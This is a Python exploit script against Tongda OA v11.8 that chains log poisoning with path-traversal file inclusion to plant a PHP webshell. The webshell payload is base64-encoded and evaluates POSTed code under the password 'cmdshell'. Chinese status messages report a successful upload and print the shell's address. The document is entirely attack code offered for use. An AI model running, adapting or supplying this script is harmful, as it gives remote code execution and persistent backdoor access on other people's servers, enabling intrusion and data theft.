import time
import requests
import urllib3
proxies={'http':'http://127.0.0.1:8080'}
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        }
    headerx = {
        "User-Agent": "Go-http-client/1.1",
        "Accept-Encoding":"gzip",
        "Content-Type":"application/x-www-form-urlencoded"
        }
    payload='''d1a4278d?json={}&aa=<?php @fputs(fopen(base64_decode('Y21kc2hlbGwucGhw'),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='));?>'''
    data='json={"url":"/general/../../nginx/logs/oa.access.log"}'
    
    incloud_url=target_url+payload
    exp_url=target_url+'ispirit/interface/gateway.php'
    vlun_url=target_url+'mac/gateway.php'
    shell_url=target_url+'mac/cmdshell.php'
    success_msg = now_time() + '[SUCCESS]  包含漏洞存在'
    success_msg2 = now_time() + '[SUCCESS]  上传webshell成功，密码为cmdshell'
    shell_msg = now_time() + '包含数据包为:{}'.format(vlun_url)
    shell_msg2 = now_time() + '密码为cmdshell，shell地址:{}'.format(shell_url)
    warning_msg = now_time() + '[WARNING]  通达OA v11.8远程包含不存在'
    error_msg = now_time() + '[通达OA v11.8远程包含][ERROR] 无法利用poc请求目标或被目标拒绝请求'
    try:
        requests.packages.urllib3.disable_warnings()
        log = requests.get(incloud_url, headers=headers, verify=False)
        response1=requests.post(exp_url, headers=headerx, data=data,verify=False)
        response2=requests.post(vlun_url, headers=headerx, data=data,verify=False)
        shell = requests.get(shell_url, headers=headers, verify=False)
        if   response2.status_code == 200:
            return success_msg,shell_msg
            if  shell.status_code==200:
                return success_msg2,shell_msg2
                
            else:
                return success_msg
        else:
                return warning_msg    

    except:
        return error_msg


            